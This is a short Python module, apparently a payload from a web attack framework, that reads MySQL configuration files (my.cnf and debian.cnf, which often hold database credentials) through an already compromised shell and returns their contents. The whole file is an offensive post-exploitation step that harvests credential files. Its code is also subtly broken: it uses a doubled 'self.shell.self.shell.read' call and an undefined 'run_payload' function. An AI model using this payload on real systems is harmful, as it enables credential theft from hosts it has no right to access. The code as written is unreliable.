import re
from plugins.attack.payloads.base_payload import base_payload

class mysql_config(base_payload):
    '''
    This payload shows MySQL configuration files.
    '''
    def run_read(self):
        result = []
        files = []

        files.append('my.cnf')
        files.append('debian.cnf')

        directory = run_payload('mysql_config_directory')
        for file in files:
            if self.shell.self.shell.read(directory+file) != '':
                result.append('-------------------------')
                result.append('FILE => '+directory+file)
                result.append(self.shell.self.shell.read(directory+file))

        result = [p for p in result if p != '']
        return result
        
